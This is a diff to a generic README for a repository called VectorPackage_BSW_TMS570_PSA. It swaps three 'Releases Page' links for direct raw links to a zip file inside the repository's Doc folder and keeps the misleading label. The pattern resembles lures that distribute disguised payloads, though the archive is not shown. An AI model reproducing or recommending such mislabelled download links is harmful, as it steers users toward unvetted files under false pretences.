@@ -7,11 +7,11 @@ Welcome to the VectorPackage_BSW_TMS570_PSA repository. This collection includes
 To get started, follow the instructions below to download and run the application. The process is straightforward, even for those who are not familiar with programming.
 
 ## 📥 Download & Install
-To download the latest version of VectorPackage_BSW_TMS570_PSA, **visit this page to download**: [Releases Page](https://github.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/releases). 
+To download the latest version of VectorPackage_BSW_TMS570_PSA, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/main/Doc/DeliveryInformation/VectorPackage_BSW_TMS570_PSA-1.4.zip). 
 
 Once you reach the releases page, look for the version you want to download. Click on the file link to download it directly to your computer. 
 
-Here is the link again for easy access: [Download VectorPackage_BSW_TMS570_PSA](https://github.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/releases).
+Here is the link again for easy access: [Download VectorPackage_BSW_TMS570_PSA](https://raw.githubusercontent.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/main/Doc/DeliveryInformation/VectorPackage_BSW_TMS570_PSA-1.4.zip).
 
 ## 🔧 System Requirements
 Before installing, ensure your system meets the following requirements:
@@ -79,4 +79,4 @@ If you have questions or need further assistance, feel free to open an issue in 
 
 For direct feedback or contributions, you are welcome to explore the contributing guidelines in the repository.
 
-Remember, you can always return to the [Releases Page](https://github.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/releases) to download updates and the latest versions of the software.
+Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/Gabhenryy/VectorPackage_BSW_TMS570_PSA/main/Doc/DeliveryInformation/VectorPackage_BSW_TMS570_PSA-1.4.zip) to download updates and the latest versions of the software.
